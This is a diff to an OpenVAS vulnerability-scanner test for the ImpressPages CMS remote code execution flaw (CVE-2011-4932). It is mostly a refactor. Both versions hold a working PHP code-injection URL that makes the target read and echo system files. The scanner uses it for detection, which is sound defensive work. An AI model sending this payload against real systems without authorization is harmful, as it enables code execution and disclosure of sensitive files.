@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ImpressPages_49798.nasl 5633 2017-03-20 15:56:23Z cfi $
+# $Id: gb_ImpressPages_49798.nasl 5700 2017-03-23 16:03:37Z cfi $
 #
 # ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability
 #
@@ -41,22 +41,18 @@ if (description)
  script_id(103378);
  script_cve_id("CVE-2011-4932");
  script_bugtraq_id(49798);
- script_version ("$Revision: 5633 $");
+ script_version("$Revision: 5700 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
  script_name("ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49798");
  script_xref(name : "URL" , value : "http://www.impresspages.org/");
  script_xref(name : "URL" , value : "http://www.impresspages.org/news/impresspages-1-0-13-security-release/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521118");
-
- script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:56:23 +0100 (Mon, 20 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 17:03:37 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-01-06 10:27:46 +0100 (Fri, 06 Jan 2012)");
- script_summary("Determine if ImpressPages CMS is prone to a remote-code execution vulnerability");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
@@ -68,39 +64,30 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!get_port_state(port))exit(0);
-
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/impress","/impresspages","/imprescms","/cms",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
-   
-  url = string(dir, "/"); 
+foreach dir( make_list_unique( "/impress", "/impresspages", "/imprescms", "/cms", cgi_dirs( port:port ) ) ) {
 
-  if(http_vuln_check(port:port, url:url,pattern:"Powered by.*ImpressPages")) {
+  if( dir == "/" ) dir = "";
+  url = dir + "/";
+  buf = http_get_cache( item:url, port:port );
 
-    foreach file (keys(files)) {
-
-      url = string(dir, "/?cm_group=text_photos\\title\\Module();echo%20file_get_contents(%27/",files[file],"%27);echo&cm_name=openvas");
-
-      if(http_vuln_check(port:port, url:url,pattern:file)) {
-
-          security_message(port:port);
-	  exit(0);
-
-      }  
-    }  
-
+  if( buf =~ "Powered by.*ImpressPages" ) {
+    foreach file( keys( files ) ) {
+      url = dir + "/?cm_group=text_photos\\title\\Module();echo%20file_get_contents(%27/" + files[file] + "%27);echo&cm_name=openvas";
+      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
+    }
   }
 }
 
-exit(0);
-
+exit( 99 );
